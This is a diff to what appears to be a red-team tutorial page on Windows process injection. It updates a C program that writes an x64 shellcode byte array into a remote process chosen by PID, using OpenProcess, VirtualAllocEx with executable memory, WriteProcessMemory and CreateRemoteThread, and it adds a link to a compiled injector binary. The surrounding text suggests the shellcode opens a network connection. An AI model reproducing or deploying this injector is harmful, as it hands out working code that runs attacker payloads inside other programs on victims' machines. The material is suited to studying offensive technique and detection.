@@ -92,7 +92,7 @@ Back to the x64 bit shellcode - compiling and executing the binary gives us the 
 #include "stdafx.h"
 #include "Windows.h"
 
-int main()
+int main(int argc, char *argv[])
 {
 	unsigned char shellcode[] =
 		"\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef\xff"
@@ -134,7 +134,8 @@ int main()
 	HANDLE remoteThread;
 	PVOID remoteBuffer;
 
-	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 5428);
+	printf("Injecting to PID: %i", atoi(argv[1]));
+	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
 	remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
 	WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);
 	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
@@ -145,6 +146,8 @@ int main()
 ```
 {% endcode-tabs-item %}
 {% endcode-tabs %}
+
+{% file src="../../.gitbook/assets/inject1.exe" caption="Inject shellcode to Remote Process w/ CreateRemoteThread" %}
 
 The above code will inject the shellcode into a notepad.exe process with PID 5428. Below shows notepad has not initiated any TCP connections yet:
 
